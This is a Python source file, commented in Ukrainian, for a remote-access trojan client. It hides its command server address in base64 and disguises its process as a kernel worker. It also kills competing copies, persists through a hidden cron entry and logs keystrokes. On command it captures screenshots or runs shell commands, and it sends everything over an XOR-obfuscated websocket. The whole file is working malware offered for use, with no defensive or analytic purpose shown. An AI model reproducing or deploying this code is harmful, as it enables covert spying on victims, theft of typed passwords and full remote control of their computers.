import asyncio
import websockets
import os
import subprocess
import uuid
import base64
import sys
import shutil
import glob
import io
import socket
import signal
import getpass
from io import BytesIO

# Динамічний імпорт модулів
try: import setproctitle
except: setproctitle = None
try: from PIL import ImageGrab
except: ImageGrab = None
try: from pynput import keyboard
except: keyboard = None

# --- КОНФІГУРАЦІЯ ---
_S = "d3M6Ly8xOTIuMTY4LjEwLjgyOjgwMDAvd3Mv" 
X_KEY = "AMY_2026_SECRET"
FAKE_NAME = "[kworker/u2:1-events]"

log_buffer = []

def get_url(): 
    try: return base64.b64decode(_S).decode()
    except: return ""

def crypt_logic(d):
    k = X_KEY
    return "".join(chr(ord(d[i]) ^ ord(k[i % len(k)])) for i in range(len(d)))

def decrypt(m):
    try: 
        decoded = base64.b64decode(m).decode()
        return crypt_logic(decoded)
    except: return None

def encrypt(m): 
    return base64.b64encode(crypt_logic(m).encode()).decode()

def masquerade():
    """Маскування під системний процес ядра"""
    if setproctitle: 
        setproctitle.setproctitle(FAKE_NAME)
    else:
        try:
            import ctypes
            libc = ctypes.CDLL('libc.so.6')
            libc.prctl(15, FAKE_NAME.encode(), 0, 0, 0)
        except: pass

def kill_others():
    """Хірургічне очищення конкурентів. Ігнорує власну сесію та батьківський процес."""
    my_pid = os.getpid()
    parent_pid = os.getppid() 
    try:
        p = subprocess.run(['ps', '-eo', 'pid,comm,args'], capture_output=True, text=True)
        for line in p.stdout.splitlines():
            if FAKE_NAME in line or "client.py" in line:
                parts = line.strip().split()
                if not parts: continue
                pid = int(parts[0])
                # Вбиваємо тільки якщо це не ми, не наш бінарник в SSH і не оболонка
                if pid != my_pid and pid != parent_pid:
                    try: os.kill(pid, signal.SIGKILL)
                    except: pass
    except: pass

def is_singleton():
    """Запобігає запуску дублів через абстрактні сокети"""
    try:
        s = socket.socket(socket.AF_UNIX, socket.SOCK_STREAM)
        s.bind('\0amy_2026_singleton_lock')
        return s
    except socket.error:
        return None

def ghost_install():
    """Закріплення в cron з очищенням старих записів"""
    try:
        p = os.path.expanduser("~/.local/share/systemd-service")
        os.makedirs(p, exist_ok=True)
        target = os.path.join(p, "sys-update")
        
        # Копіюємо бінарник або скрипт
        if not os.path.exists(target) or os.path.getsize(sys.argv[0]) != os.path.getsize(target):
            shutil.copy2(sys.argv[0], target)
            os.chmod(target, 0o755)
        
        cron_job = f"*/2 * * * * {target} >/dev/null 2>&1"
        current_cron = subprocess.run("crontab -l", shell=True, capture_output=True, text=True).stdout
        if target not in current_cron:
            # Очищуємо старі записи AMY і додаємо новий
            clean_lines = [l for l in current_cron.splitlines() if "sys-update" not in l and l.strip()]
            clean_lines.append(cron_job)
            new_cron = "\n".join(clean_lines) + "\n"
            proc = subprocess.Popen(['crontab', '-'], stdin=subprocess.PIPE)
            proc.communicate(input=new_cron.encode())
    except: pass

async def run_shell(cmd):
    """Виконує команду з чистим виводом та відновленим PATH"""
    try:
        env = os.environ.copy()
        env["PATH"] = "/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin"
        
        proc = await asyncio.create_subprocess_shell(
            cmd, stdout=asyncio.subprocess.PIPE, stderr=asyncio.subprocess.PIPE, env=env
        )
        stdout, stderr = await proc.communicate()
        res = stdout.decode().strip() + stderr.decode().strip()
        return res if res else "(команда виконана)"
    except Exception as ex:
        return f"Shell Error: {str(ex)}"

def take_screenshot_sync():
    """Захоплення екрана з підтримкою X11 та root"""
    if not ImageGrab: return None
    try:
        if 'DISPLAY' not in os.environ: os.environ['DISPLAY'] = ':0'
        # Пошук прав доступу до дисплея
        for p in glob.glob('/home/*/.Xauthority') + ['/root/.Xauthority']:
            if os.path.exists(p):
                os.environ['XAUTHORITY'] = p
                break
        
        buf = io.BytesIO()
        ImageGrab.grab().save(buf, format="PNG")
        return base64.b64encode(buf.getvalue()).decode()
    except: return None

async def keylog_sender(ws):
    global log_buffer
    while True:
        await asyncio.sleep(30)
        if log_buffer:
            try:
                await ws.send(encrypt(f"LOGS:{''.join(log_buffer)}"))
                log_buffer = []
            except: pass

def on_press(key):
    try: log_buffer.append(key.char)
    except AttributeError:
        if key == keyboard.Key.space: log_buffer.append(" ")
        elif key == keyboard.Key.enter: log_buffer.append("\n")
        else: log_buffer.append(f"[{key.name}]")

async def start():
    # 1. Singleton check
    lock = is_singleton()
    if not lock: sys.exit(0)

    # 2. Очищення та підготовка
    kill_others()
    masquerade()
    ghost_install()
    
    # 3. Кейлоггер
    if keyboard:
        try:
            listener = keyboard.Listener(on_press=on_press)
            listener.start()
        except: pass

    # 4. Статичний HWID
    b_id = hex(uuid.getnode())[2:10]
    
    while True:
        try:
            url = get_url()
            async with websockets.connect(url + b_id, ping_interval=20) as ws:
                asyncio.create_task(keylog_sender(ws))
                while True:
                    m = await ws.recv()
                    cmd = decrypt(m)
                    if not cmd: continue
                    cmd = cmd.strip()
                    
                    if cmd == "screenshot":
                        shot = await asyncio.to_thread(take_screenshot_sync)
                        if shot: await ws.send(encrypt(f"SCREENSHOT:{shot}"))
                        else: await ws.send(encrypt("SYS_MSG: Screen error"))
                            
                    elif cmd == "self_destruct":
                        subprocess.run("crontab -r", shell=True)
                        os._exit(0)
                        
                    else:
                        response = await run_shell(cmd)
                        await ws.send(encrypt(response))
        except:
            await asyncio.sleep(10)

if __name__ == "__main__":
    asyncio.run(start())
